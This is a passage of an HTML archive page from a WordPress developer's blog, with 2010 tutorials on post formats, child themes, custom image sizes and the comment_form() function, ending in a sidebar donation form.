<pre class="brush: php; title: ; notranslate" title="">
if (in_category('asides')) {
   // stuff to display the aside format post here
} else if (in_category('gallery')) {
   // stuff to display the gallery format post here
} else {
   // code to display the normal format post here
}
</pre>
<p>Then, when he makes a post, he just picks the right category for it and that changes how it shows up on the site.</p>
<p>The problem is that this is a bit lame. Categories should be adjectives describing the post, not sorting them into functionally different buckets for use by the theme. Sure, you can use them that way, but that&#8217;s confusing to some users. You could use tags in the exact same way with the has_tag() function, but that doesn&#8217;t make it a good idea.</p>
<h3>Post Formats (coming soon to a WordPress 3.1 near you)</h3>
<p>Enter <a href="http://codex.wordpress.org/Post_Formats">Post Formats</a>. Tumblr has had these for a long time:</p>
<div id="attachment_310" style="width: 510px" class="wp-caption alignnone"><a href="http://i2.wp.com/ottopress.com/files/2010/11/tumblrpostformats.jpg"><img class="size-full wp-image-310" title="tumblrpostformats" src="http://i0.wp.com/ottopress.com/files/2010/11/tumblrpostformats.jpg?resize=500%2C120" alt="Tumblr's post formats" data-recalc-dims="1" /></a><p class="wp-caption-text">Tumblr&#39;s post formats</p></div>
<p>Basically they just define a format for a post to fit into at display time. So the theme could say &#8220;asides won&#8217;t have a title displayed for them&#8221;, and voila. A theme can do something like this to define what formats it supports:</p>
<pre class="brush: php; title: ; notranslate" title="">
add_theme_support( 'post-formats', array( 'aside', 'gallery' ) );
</pre>
<p>And it can do something like this when displaying things differently:</p>
<pre class="brush: php; title: ; notranslate" title="">
if ( has_post_format( 'aside' ) ) {
   // display the aside format
}
</pre>
<p>So there we go. Theme authors can define what formats they support, and they can style those formats appropriately. And we didn&#8217;t use categories at all.</p>
<p>Additional: For those people trying to implement this in themes, post formats also add new styles to the post_class() call. You can use .format-XXX to style based on post formats on a post.</p>
<h3>Custom Post Formats and why you don&#8217;t need them</h3>
<p>As soon as this was announced, naturally theme authors got up in arms, because theme authors are a rowdy bunch of folks. They like to do things their own way. So there was instantly the question of &#8220;how do I add my own format&#8221;? The answer is: you don&#8217;t, nor should you even think about it.</p>
<p>Why? Why prevent customization? Think of it from the perspective of the user:</p>
<ul>
<li>They&#8217;ve got an existing set of posts.</li>
<li>Those posts have formats.</li>
<li>They switch to your theme, which uses some custom formats.</li>
<li>Now their own posts don&#8217;t display properly with the new theme, because it&#8217;s using a whole different set of formats.</li>
<li>Bad user experience, that is.</li>
</ul>
<p>Now, from the perspective of a theme author, I understand the reasoning here. You want to be able to display things differently.</p>
<p>The problem is that <em>you were already able to do that before</em>.</p>
<p>Custom taxonomies have been around a long time. All you had to do was to a) create a custom taxonomy (call it &#8220;mytheme_formats&#8221;), b) allow users to sort posts into your taxonomy, and c) display things differently in the theme based on the terms in that taxonomy.</p>
<p>Post Formats is just a taxonomy. It&#8217;s a set of adjectives, describing the nouns that are the posts. So now we have &#8220;aside posts&#8221; and &#8220;gallery posts&#8221; and &#8220;chat posts&#8221; and &#8220;video posts&#8221; and so on. If you want to make your own formats, then you&#8217;ve had that ability forever. Why have you not already used it?</p>
<p>The answer to why you didn&#8217;t do it before is because <em>there was no standard set of formats</em>.</p>
<p>Without a standard set to work with, users won&#8217;t have any idea what your formats mean. You have to write documentation. You have to educate the user. You have to explain what this weirdness in your theme is.</p>
<p>Post formats changes that. Now you have a standard set of formats, and the user, having used other themes that support those formats too, will have some idea of what they mean already. But in order for this to work, themes must all use the same basic formats. There has to be a standard set of adjectives to describe the posts.</p>
<p>If you want to create your own set, then create your own taxonomy and box to have your set in it. But don&#8217;t complain when users don&#8217;t understand why your theme&#8217;s formats don&#8217;t mesh with the formats of every other theme that does support them.</p>
<p>The point of standards is to be standard. You don&#8217;t have to support the standard, but you also will have to deal with the consequences of being non-standard.</p>
<h3>Summing up</h3>
<p>In the end, you want to present things to your users in a method that causes the least confusion. If your user wants to display things in a single stream, then those things need to be Posts. If the user wants different things in that stream to display in different ways, then you should use a taxonomy to do that, and the post format taxonomy provides a nice and easy way to standardize that and be compatible with other themes.</p>
<p>If you want to go it alone with custom things, feel free, but be aware of the risk.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/7z' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/authors/" rel="tag">authors</a>, <a href="http://ottopress.com/tag/categories/" rel="tag">categories</a>, <a href="http://ottopress.com/tag/post-formats/" rel="tag">post-formats</a>, <a href="http://ottopress.com/tag/tags/" rel="tag">tags</a>, <a href="http://ottopress.com/tag/taxonomies/" rel="tag">taxonomies</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a><br />					Category: <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2010/post-types-and-formats-and-taxonomies-oh-my/#comments" title="Comment on Post types and formats and taxonomies, oh my!">94 Comments</a>									 </div>
			</div>			<div id="post-213" class="post-213 post type-post status-publish format-standard hentry category-code category-wordpress tag-child tag-override tag-parent tag-theme tag-twentyten tag-wordpress-2" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2010/wordpress-protip-child-themes/" rel="bookmark" title="Permanent Link to WordPress PROTIP: Child Themes" itemprop="url"><span itemprop="name">WordPress PROTIP: Child Themes</span></a></h2>
				<div class="postmetadata">August 4, 2010, 12:41 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p><a href="http://i2.wp.com/ottopress.com/files/2010/08/200px-ParentChildIcon.svg_.png"><img class="alignright size-full wp-image-217" title="200px-ParentChildIcon.svg" src="http://i0.wp.com/ottopress.com/files/2010/08/200px-ParentChildIcon.svg_.png?resize=200%2C200" alt="" data-recalc-dims="1" /></a>While this isn&#8217;t affecting a lot of people now, it will be in the future. Especially if you use well-supported themes.</p>
<p>Somewhere in version 2.8 or 2.9, WordPress started supporting Theme Updates. In the same way that it supports automatic plugin updates from the plugin repository, a theme developer can now make updates to their theme in the themes repository, and you can upgrade it directly from the WordPress interface.</p>
<p>This is a great thing. Theme developers can fix problems, add features, and have it easy for the users to get those changes right away.</p>
<p>Unfortunately, the theme has historically been the user&#8217;s playground. Themes are frequently modified by the user directly. Whether it be for looks or for adding code to be used by plugins or whatever, the theme you&#8217;re using is very probably not the theme you downloaded. So upgrading will blow away your changes. Thus, most people are disinclined to upgrade their themes.</p>
<p>The way to avoid this is with a child theme. <a href="http://codex.wordpress.org/Child_Themes">Child themes</a> derive from another theme, called the parent theme. A child theme, by default, looks exactly like the parent. Then you make your changes to the child, and those changes are used on the site. The parent remains untouched. So, when you upgrade the parent theme, the changes you made don&#8217;t go anywhere. They stay right where they are.</p>
<p>So let&#8217;s dive right in:</p>
<h3>How to Make a Child Theme</h3>
<p>First, obviously, install the parent theme. Take note of what directory name it goes into. You can find this on the Theme&#8217;s screen, it will tell you what directory each theme is in. The new default theme in 3.0 is &#8220;twentyten&#8221;. So let&#8217;s use that one as our parent.</p>
<p>Now, create a new directory in your /wp-content/themes directory. This is where we&#8217;ll put our child theme. Let&#8217;s call it &#8220;mytheme&#8221;.</p>
<p>In the mytheme directory, create a new style.css file. Put this in it:</p>
<pre class="brush: css; title: ; notranslate" title="">
/*
Theme Name: My Theme
Template: twentyten
*/
@import url('../twentyten/style.css');
</pre>
<p>Finally, load up WordPress and go activate your new &#8220;My Theme&#8221; theme. You&#8217;ll notice that WordPress tells you both what directory your child theme is in <em>and</em> what directory its parent is located in.</p>
<p>Now you&#8217;re running on a child theme. It doesn&#8217;t have any changes in it, so it looks exactly like the twentyten theme does, but still, we&#8217;re running it.</p>
<h3>How to Change Things</h3>
<p>Let&#8217;s say I wanted to change the color of the post titles to, say, <span style="color: #339966;">green</span>. A silly change, but it illustrates the point.</p>
<p>Normally, I&#8217;d go edit the theme, find wherever the color of the text is defined, and change it or add to it to make the titles change in the way I want. In this case, I do the same thing, but I modify the child theme, and I do it in a way that overrides the specificity of the parent&#8217;s CSS code.</p>
<p>To do this, I add this code to mytheme&#8217;s style.css file:</p>
<pre class="brush: css; title: ; notranslate" title="">
#content h2.entry-title a {
   color: green;
}
</pre>
<p>Why that change? Well, I looked at the parent theme and found that &#8220;<em>#content .entry-title a</em>&#8221; was what it used to define the color of the post title links. To override that, I need to be more specific.</p>
<p><a href="http://www.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/">Specificity</a> is a difficult concept for some people, but basically it breaks down to this: When the browser is parsing the CSS, more specific rules take precedence over less specific rules.</p>
<p>In my case I needed to be more specific than &#8220;<em>#content .entry-title a</em>&#8220;. By adding the h2 to the .entry-title rule, I achieve that because h2.entry-title only will affect h2&#8242;s with the entry-title class, while just .entry-title can affect any tag on the page with that class.</p>
<p>The fact that only the h2&#8242;s on my page have .entry-title is irrelevant. The HTML <em>doesn&#8217;t actually matter</em> in regards to specificity. A rule is more specific based on what it <em>can</em> affect, not on what it <em>actually </em>affects.</p>
<p>So by making my rule more specific, I can override the color of those title&#8217;s in my own CSS file separately, and without changing anything about the parent theme.</p>
<h3>Overriding Templates</h3>
<p>Child themes are not limited to overriding only styling, although in many cases that may be the only customization you need. Best to stick with the rule of the minimum; try to make the most minimal change you can make to accomplish what you want to accomplish. But if you do want to change the way some of the templates work, you can do that too.</p>
<p>All you have to do is to copy the specific template file you want to alter from the parent theme into the child theme&#8217;s directory, then make your changes. The way WordPress works is when it looks for some template file, it looks in the child theme first, then it goes to the parent theme if the file it wants isn&#8217;t there.</p>
<p>Note that you&#8217;re not limited to overriding existing files in the parent. The entire <a href="http://codex.wordpress.org/Template_Hierarchy">Template Hierarchy</a> applies to child themes too, so if you want to define a category.php file for Category Templates, and the parent theme doesn&#8217;t have that file, then you can create a new one in your child and it will be used. You will probably still want to start out with some existing template from the parent though, so look at the Template Hierarchy to see which template the parent is using for your case. The index.php is the usual suspect in these cases, so you can probably just copy that to the child theme and rename it to the template file you want it to be.</p>
<h3>Overriding Functions</h3>
<p>One exception to the overriding mechanism of child themes has to do with the functions.php file. In a child theme situation, both functions.php files from both themes are loaded. This is necessary because elements of your parent theme might require pieces of the functions.php file to be loaded. This can make overriding functions in the parent theme tricky unless it&#8217;s written to allow you to do just that.</p>
<p>The key to this is that the functions.php file of the child theme is loaded first. So if the parent theme is written in a manner WordPress calls &#8220;<a href="http://codex.wordpress.org/Pluggable_Functions">pluggable</a>&#8220;, then you can override those functions.</p>
<p>In the twentyten theme&#8217;s functions.php file, several of the functions are defined like this:</p>
<pre class="brush: php; title: ; notranslate" title="">
if ( ! function_exists( 'twentyten_admin_header_style' ) ) :
function twentyten_admin_header_style() {
...
}
endif;
</pre>
<p>That is a pluggable function. Basically, before it defines the function, it checks to see if the function is already defined. If the parent theme uses this mechanism, then a child theme can override this function by simply defining a function of the same name first. So all you have to do to change it is to copy the function into your child&#8217;s functions.php file and make your changes. When the parent theme loads, it will see that you already defined the function and continue on.</p>
<p>Another way to override things is through the normal WordPress action and filter hook mechanisms. If a theme&#8217;s functions.php file uses those, then you can simply add your own hooked functions with different names. However, because the child&#8217;s functions.php file loads first, it can&#8217;t actually unhook things defined by the parent theme.</p>
<p>The way to get around this is to use the after_setup_theme action hook. This action is called immediately after both functions.php files are loaded.</p>
<p>For example, if I look at the twentyten theme, I&#8217;ll find this:</p>
<pre class="brush: php; title: ; notranslate" title="">
function twentyten_excerpt_length( $length ) {
	return 40;
}
add_filter( 'excerpt_length', 'twentyten_excerpt_length' );
</pre>
<p>I don&#8217;t want that, I want my excerpts to be 55 words instead. So I add this to my functions.php file:</p>
<pre class="brush: php; title: ; notranslate" title="">
function my_excerpt_length( $length ) {
	return 55;
}
add_filter( 'excerpt_length', 'my_excerpt_length' );
</pre>
<p>Whoops! It doesn&#8217;t work. Why not? Because I didn&#8217;t remove twentyten&#8217;s hook, and its filter is overriding mine. So I have to add this too:</p>
<pre class="brush: php; title: ; notranslate" title="">
function my_undo_hooks( $length ) {
	remove_filter( 'excerpt_length', 'twentyten_excerpt_length' );
}
add_action( 'after_setup_theme', 'my_undo_hooks' );
</pre>
<p>And then it works. I&#8217;ve added my filter, and removed the one in twentyten. Voila.</p>
<h3>Programmer Note</h3>
<p>In a WordPress theme you&#8217;ll often find references to &#8220;stylesheet_uri&#8221; and &#8220;stylesheet_dir&#8221;. You&#8217;ll also find references to &#8220;template_uri&#8221; and &#8220;template_dir&#8221;. Normally, these are the same thing. In a child theme case, they&#8217;re not. Stylesheet refers to the child theme. Template refers to the parent theme. This is an important distinction that you&#8217;ll want to make when creating your theme. You should probably use stylesheet in most cases, except for when you need to specifically refer to the parent (for image URL creation and such).</p>
<h3>Conclusion</h3>
<p>Child themes are a very good way to survive theme upgrades, and if you&#8217;re using a well supported theme, these are likely to become more common. It&#8217;s still perfectly safe to modify your theme directly (except for twentyten! Normal WP upgrades overwrite twentyten), but it&#8217;s always a good idea to keep your customizations separate. They&#8217;re a lot easier to manage that way.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/6' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/child/" rel="tag">child</a>, <a href="http://ottopress.com/tag/override/" rel="tag">override</a>, <a href="http://ottopress.com/tag/parent/" rel="tag">parent</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a>, <a href="http://ottopress.com/tag/twentyten/" rel="tag">twentyten</a>, <a href="http://ottopress.com/tag/wordpress-2/" rel="tag">WordPress</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2010/wordpress-protip-child-themes/#comments" title="Comment on WordPress PROTIP: Child Themes">28 Comments</a>									 </div>
			</div>			<div id="post-189" class="post-189 post type-post status-publish format-standard hentry category-code category-wordpress tag-force tag-image tag-size tag-theme tag-tip tag-wordpress-2" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2010/wordpress-theme-tip-force-an-image-size/" rel="bookmark" title="Permanent Link to WordPress Theme Tip: Force an Image Size" itemprop="url"><span itemprop="name">WordPress Theme Tip: Force an Image Size</span></a></h2>
				<div class="postmetadata">June 14, 2010, 12:33 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p><img class="alignright size-full wp-image-192" title="mugs_sizeMattersMug2" src="http://i0.wp.com/ottopress.com/files/2010/06/mugs_sizeMattersMug2.jpg?resize=212%2C212" alt="" data-recalc-dims="1" />I am making a theme today and working on the image attachment templates. I found that I needed the next and previous image links (in the single image templates&#8230; image.php) to be of a specific size, regardless of what the settings the admin tool were. Specifically, I want them to always be 100&#215;100 pixels in size, and cropped.</p>
<p>Image sizing is always a problem for themes. Theme designers want their theme to be pixel perfect in all cases, but WordPress wants the user to have some form of control. With image sizes, WordPress lets the user pick the size of their image thumbnails and so forth. In that case, using those becomes problematic for certain places in the theme which need pre-defined image sizes.</p>
<p>Here&#8217;s the quick and easy solution: add_image_size. This function lets you create custom image sizes that can be used by your theme. Plugins can do the same sort of things, of course, but this really comes in more useful as a theme developer&#8217;s tool.</p>
<p>In my functions.php file, I put this code:</p>
<pre class="brush: php; title: ; notranslate" title="">
add_image_size( 'themename-nav-thumbnail', 100, 100, true );
</pre>
<p>That creates a new image size for WordPress. When image files get uploaded, that new image size will be magically created along with all the other sizes. In this case, it&#8217;ll be 100 by 100 pixels, and cropped exactly to that (that&#8217;s what the &#8220;true&#8221; means).</p>
<p>Note the use of the &#8220;themename&#8221; prefix? You can use anything you like here, actually, but it&#8217;s a good habit to always use prefixes for custom identifiers you ever make. This prevents things from interfering with each other.</p>
<p>Anyway, to then use that size for my navigational thumbnails, this small bit of code works:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;div class=&quot;prev-img&quot;&gt;
&lt;?php echo previous_image_link('themename-nav-thumbnail'); ?&gt;
&lt;/div&gt;
&lt;div class=&quot;next-img&quot;&gt;
&lt;?php echo next_image_link('themename-nav-thumbnail'); ?&gt;
&lt;/div&gt;
</pre>
<p>I wrapped them in DIVs so that I can float them left and right and style them and such.</p>
<p>So custom image sizes are easy enough to do, but it&#8217;s a trick I didn&#8217;t know about until I needed it just now. Thought somebody else should know about it too.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/e' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/force/" rel="tag">force</a>, <a href="http://ottopress.com/tag/image/" rel="tag">image</a>, <a href="http://ottopress.com/tag/size/" rel="tag">size</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a>, <a href="http://ottopress.com/tag/tip/" rel="tag">tip</a>, <a href="http://ottopress.com/tag/wordpress-2/" rel="tag">WordPress</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2010/wordpress-theme-tip-force-an-image-size/#comments" title="Comment on WordPress Theme Tip: Force an Image Size">11 Comments</a>									 </div>
			</div>			<div id="post-137" class="post-137 post type-post status-publish format-standard hentry category-code category-wordpress tag-3-0 tag-comment tag-comments tag-form tag-functions tag-theme tag-wordpress-2" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2010/wordpress-3-0-theme-tip-the-comment-form/" rel="bookmark" title="Permanent Link to WordPress 3.0 Theme Tip: The Comment Form" itemprop="url"><span itemprop="name">WordPress 3.0 Theme Tip: The Comment Form</span></a></h2>
				<div class="postmetadata">May 6, 2010, 10:57 am <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p><a href="http://i0.wp.com/ottopress.com/files/2010/04/blue-xl.png"><img class="alignright size-thumbnail wp-image-93" title="WordPress Logo" src="http://i2.wp.com/ottopress.com/files/2010/04/blue-xl.png?resize=150%2C150" alt="" data-recalc-dims="1" /></a></p>
<p>WordPress 3.0 has something very handy that I want theme authors to start implementing as soon as possible.</p>
<p>To show exactly why it&#8217;s so useful, I modified my own theme to start using it.</p>
<h3>Demonstration</h3>
<p>So, here&#8217;s a big hunk of code I pulled out of my current theme&#8217;s comments.php. This hunk of code has only one purpose: To display the form area where people can leave a comment:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;?php if ('open' == $post-&gt;comment_status) : ?&gt;

&lt;div id=&quot;respond&quot;&gt;

&lt;h3&gt;&lt;?php comment_form_title( 'Leave a Reply', 'Leave a Reply to %s' ); ?&gt;&lt;/h3&gt;

&lt;div class=&quot;cancel-comment-reply&quot;&gt;
	&lt;small&gt;&lt;?php cancel_comment_reply_link(); ?&gt;&lt;/small&gt;
&lt;/div&gt;

&lt;?php if ( get_option('comment_registration') &amp;&amp; !$user_ID ) : ?&gt;
&lt;p&gt;You must be &lt;a href=&quot;&lt;?php echo get_option('siteurl'); ?&gt;/wp-login.php?redirect_to=&lt;?php echo urlencode(get_permalink()); ?&gt;&quot;&gt;logged in&lt;/a&gt; to post a comment.&lt;/p&gt;
&lt;?php else : ?&gt;

&lt;form action=&quot;&lt;?php echo get_option('siteurl'); ?&gt;/wp-comments-post.php&quot; method=&quot;post&quot; id=&quot;commentform&quot;&gt;

&lt;?php if ( $user_ID ) : ?&gt;

&lt;p&gt;Logged in as &lt;a href=&quot;&lt;?php echo get_option('siteurl'); ?&gt;/wp-admin/profile.php&quot;&gt;&lt;?php echo $user_identity; ?&gt;&lt;/a&gt;. &lt;a href=&quot;&lt;?php echo wp_logout_url(get_permalink()); ?&gt;&quot; title=&quot;Log out of this account&quot;&gt;Log out &amp;raquo;&lt;/a&gt;&lt;/p&gt;

&lt;?php else : ?&gt;

&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;author&quot; id=&quot;author&quot; value=&quot;&lt;?php echo $comment_author; ?&gt;&quot; size=&quot;22&quot; tabindex=&quot;1&quot; /&gt;
&lt;label for=&quot;author&quot;&gt;&lt;small&gt;Name &lt;?php if ($req) echo &quot;(required)&quot;; ?&gt;&lt;/small&gt;&lt;/label&gt;&lt;/p&gt;

&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;email&quot; id=&quot;email&quot; value=&quot;&lt;?php echo $comment_author_email; ?&gt;&quot; size=&quot;22&quot; tabindex=&quot;2&quot; /&gt;
&lt;label for=&quot;email&quot;&gt;&lt;small&gt;Mail (will not be published) &lt;?php if ($req) echo &quot;(required)&quot;; ?&gt;&lt;/small&gt;&lt;/label&gt;&lt;/p&gt;

&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;url&quot; id=&quot;url&quot; value=&quot;&lt;?php echo $comment_author_url; ?&gt;&quot; size=&quot;22&quot; tabindex=&quot;3&quot; /&gt;
&lt;label for=&quot;url&quot;&gt;&lt;small&gt;Website&lt;/small&gt;&lt;/label&gt;&lt;/p&gt;

&lt;?php endif; ?&gt;

&lt;!--&lt;p&gt;&lt;small&gt;&lt;strong&gt;XHTML:&lt;/strong&gt; You can use these tags: &lt;code&gt;&lt;?php echo allowed_tags(); ?&gt;&lt;/code&gt;&lt;/small&gt;&lt;/p&gt;--&gt;

&lt;p&gt;&lt;textarea name=&quot;comment&quot; id=&quot;comment&quot; cols=&quot;100%&quot; rows=&quot;10&quot; tabindex=&quot;4&quot;&gt;&lt;/textarea&gt;&lt;/p&gt;

&lt;p&gt;&lt;input name=&quot;submit&quot; type=&quot;submit&quot; id=&quot;submit&quot; tabindex=&quot;5&quot; value=&quot;Submit Comment&quot; /&gt;
&lt;?php comment_id_fields(); ?&gt;
&lt;/p&gt;
&lt;?php do_action('comment_form', $post-&gt;ID); ?&gt;

&lt;/form&gt;

&lt;?php endif; // If registration required and not logged in ?&gt;
&lt;/div&gt;
&lt;?php endif; // if you delete this the sky will fall on your head ?&gt;
</pre>
<p>Nasty, eh? It&#8217;s a mess of if/else statements. It handles cases where the user is logged in or not, where the comments are open or closed, whether registration is required, etc. It&#8217;s confusing, difficult to modify, poor for CSS referencing&#8230;</p>
<p>Here&#8217;s what I replaced all that code with:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;?php comment_form(); ?&gt;
</pre>
<p>Now then, that&#8217;s much better, isn&#8217;t it?</p>
<p>The comment_form function is new to 3.0. Basically, it standardizes the comments form. It makes it wonderful for us plugin authors, since now we can easily modify the comments form with various hooks and things. I&#8217;ve already modified <a href="http://ottopress.com/wordpress-plugins/simple-facebook-connect/">Simple Facebook Connect</a> and <a href="http://ottopress.com/wordpress-plugins/simple-twitter-connect/">Simple Twitter Connect</a> to support this new approach; if you&#8217;re using a theme with this, then the user won&#8217;t have to modify it to have their buttons appear on the comments form.</p>
<h3>Customizing</h3>
<p>Since theme authors love to customize things, the comments form is also extremely customizable. Doing it, however, can be slightly confusing.</p>
<p>Inside the comments_form function, we find some useful hooks to let us change things around.</p>
<p>The first hook is comment_form_default_fields. This lets us modify the three main fields: author, email, and website. It&#8217;s a filter, so we can change things as they pass through it. The fields are stored in an array which contains the html that is output. So it looks sorta like this:</p>
<pre class="brush: php; title: ; notranslate" title="">
array(
	'author' =&gt; '&lt;p class=&quot;comment-form-author&quot;&gt;...',
	'email'  =&gt; '&lt;p class=&quot;comment-form-email&quot;&gt;...',
	'url'    =&gt; '&lt;p class=&quot;comment-form-url&quot;&gt;...'
);
</pre>
<p>I truncated it for simplicity. But what this means is that code like this can modify the fields:</p>
<pre class="brush: php; title: ; notranslate" title="">
function my_fields($fields) {
$fields['new'] = '&lt;p&gt;Some new input field here&lt;/p&gt;';
return $fields;
}
add_filter('comment_form_default_fields','my_fields');
</pre>
<p>That sort of thing lets us add a new input field, or modify the existing ones, etc&#8230;</p>
<p>But fields aren&#8217;t the only thing we can change. There&#8217;s a comment_form_defaults filter too. It gets a lot of the surrounding text of the comments form. The defaults look sorta like this:</p>
<pre class="brush: php; title: ; notranslate" title="">
$defaults = array(
	'fields'               =&gt; apply_filters( 'comment_form_default_fields', $fields ),
	'comment_field'        =&gt; '&lt;p class=&quot;comment-form-comment&quot;&gt;...',
	'must_log_in'          =&gt; '&lt;p class=&quot;must-log-in&quot;&gt;...',
	'logged_in_as'         =&gt; '&lt;p class=&quot;logged-in-as&quot;&gt;...',
	'comment_notes_before' =&gt; '&lt;p class=&quot;comment-notes&quot;&gt;...',
	'comment_notes_after'  =&gt; '&lt;dl class=&quot;form-allowed-tags&quot;&gt;...',
	'id_form'              =&gt; 'commentform',
	'id_submit'            =&gt; 'submit',
	'title_reply'          =&gt; __( 'Leave a Reply' ),
	'title_reply_to'       =&gt; __( 'Leave a Reply to %s' ),
	'cancel_reply_link'    =&gt; __( 'Cancel reply' ),
	'label_submit'         =&gt; __( 'Post Comment' ),
);
</pre>
<p>All the various pieces of html that are displayed as part of the comment form section are defined here. So those can be modified as you see fit. However, unlike the fields, adding new bits here won&#8217;t help us at all. The fields get looped through for displaying them, these are just settings that get used at various times.</p>
<p>But filters are not the only way to modify these. The comment_form function actually can take an array of arguments as the first parameter, and those arguments will modify the form. So if we wanted a simple change, like to change the wording of &#8220;Leave a Reply&#8221;, then we could do this:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;?php comment_form(array('title_reply'=&gt;'Leave a Reply, Stupid')); ?&gt;
</pre>
<p>This gives us a simple and easy way to make changes without all the trouble of filters. Nevertheless, those filters can be very useful for more complex operations.</p>
<h3>But wait, there&#8217;s more!</h3>
<p>As the comments form is being created, there&#8217;s a ton of action hooks being called, at every stage. So if you want to insert something into the form itself, there&#8217;s easy ways to do it.</p>
<p>A quick list of the action hooks. Most of them are self-explanatory.</p>
<ul>
<li> comment_form_before</li>
<li> comment_form_must_log_in_after</li>
<li> comment_form_top</li>
<li> comment_form_logged_in_after</li>
<li> comment_notes_before</li>
<li> comment_form_before_fields</li>
<li> comment_form_field_{$name} (a filter on each and every field, where {$name} is the key name of the field in the array)</li>
<li> comment_form_after_fields</li>
<li> comment_form_field_comment (a filter on the &#8220;comment_field&#8221; default setting, which contains the textarea for the comment)</li>
<li> comment_form (action hook after the textarea, for backward compatibility mainly)</li>
<li> comment_form_after</li>
<li> comment_form_comments_closed</li>
</ul>
<h3>CSS and other extras</h3>
<p>Let&#8217;s not forget styling. All parts of the comments form have nice classes and id&#8217;s and such. Take a look at the resulting HTML source and you&#8217;ll find all the styling capabilities you like. Also, everything is properly semantic, using label tags and aria-required and so forth. All the text is run through the translation system for core translations.</p>
<p>So theme authors should start modifying their themes to use this instead of the existing big-ugly-comment-form code. Your users will thank you for it. Plugin authors will thank you for it. And really, it&#8217;s about time we made WordPress themes more about design and less about the nuts and bolts of the programming, no?</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/n' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/3-0/" rel="tag">3.0</a>, <a href="http://ottopress.com/tag/comment/" rel="tag">comment</a>, <a href="http://ottopress.com/tag/comments/" rel="tag">comments</a>, <a href="http://ottopress.com/tag/form/" rel="tag">form</a>, <a href="http://ottopress.com/tag/functions/" rel="tag">functions</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a>, <a href="http://ottopress.com/tag/wordpress-2/" rel="tag">WordPress</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2010/wordpress-3-0-theme-tip-the-comment-form/#comments" title="Comment on WordPress 3.0 Theme Tip: The Comment Form">236 Comments</a>									 </div>
			</div>
		<div class="navigation">
			<div class="alignleft"><a href="http://ottopress.com/tag/theme/page/3/" >&laquo; Previous Entries</a></div>
			<div class="alignright"><a href="http://ottopress.com/tag/theme/" >Next Entries &raquo;</a></div>
		</div>
		
	
	</div>
	<div id="sidebar">
		<ul>
			
			<li id="paypal-donate" class="widget widget_wpaypal"><h2 class="widgettitle">Buy Otto a Beer</h2>
<div style="margin-top:5px;margin-bottom:5px;text-align:left;">
		<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
		<p><input type="hidden" name="cmd" value="_xclick" />
		<input type="hidden" name="business" value="otto@ottodestruct.com" />
		<input type="hidden" name="item_name" value="Donation to Otto on WordPress" />
		<input type="hidden" name="item_number" value="0" />
		<input type="hidden" name="notify_url" value="" />
		<input type="hidden" name="no_shipping" value="1" /><input type="hidden" name="return" value="http://ottopress.com" />
		<input type="hidden" name="no_note" value="1" />
		<input type="hidden" name="tax" value="0" />
		<input type="hidden" name="bn" value="PP-DonationsBF" />
		<input type="hidden" name="on0" value="Website" />
		Currency: <br />
		<select id="currency_code" name="currency_code">
		<option value="USD">U.S. Dollars</option>
		<option value="AUD">Australian Dollars</option>
		<option value="CAD">Canadian Dollars</option>
		<option value="EUR">Euros</option>
		<option value="GBP">Pounds Sterling</option>
		<option value="JPY">Yen</option></select></p>
		<p>Amount: <br /><input type="text" name="amount" size="16" title="The amount you wish to donate" value="5.00" /></p>
